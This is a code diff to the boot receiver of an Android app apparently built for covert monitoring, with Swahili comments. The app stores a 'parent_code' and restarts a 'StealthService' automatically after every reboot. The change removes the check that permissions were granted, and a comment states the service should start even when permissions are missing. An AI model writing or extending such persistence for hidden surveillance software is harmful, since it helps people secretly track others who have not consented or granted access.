@@ -11,24 +11,28 @@ public class BootReceiver extends BroadcastReceiver {
 
     @Override
     public void onReceive(Context context, Intent intent) {
-        if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) {
+        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
+            Log.d(TAG, "📱 Simu imewashwa - Inaanzisha app tena automatikali...");
+            
             SharedPreferences prefs = context.getSharedPreferences("SurveillanceApp", Context.MODE_PRIVATE);
-            boolean isVerified = prefs.getBoolean("code_verified", false);
-            boolean permissionsGranted = prefs.getBoolean("permissions_granted", false);
             String parentCode = prefs.getString("parent_code", "");
-
-            if (isVerified && permissionsGranted && !parentCode.isEmpty()) {
-                // Rudi kwa background service
+            boolean verified = prefs.getBoolean("verified", false);
+            
+            if (verified && !parentCode.isEmpty()) {
+                // Anza service tena automatikali
                 Intent serviceIntent = new Intent(context, StealthService.class);
                 serviceIntent.putExtra("PARENT_CODE", parentCode);
                 
+                // Hakikisha service inaenda kuanza hata permissions zikikosa
                 if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                     context.startForegroundService(serviceIntent);
                 } else {
                     context.startService(serviceIntent);
                 }
                 
-                Log.d(TAG, "✅ Service imerudishwa baada ya boot");
+                Log.d(TAG, "✅ StealthService imeanzishwa tena baada ya boot");
+            } else {
+                Log.d(TAG, "ℹ️ App haija verify bado au hakuna parent code");
             }
         }
     }
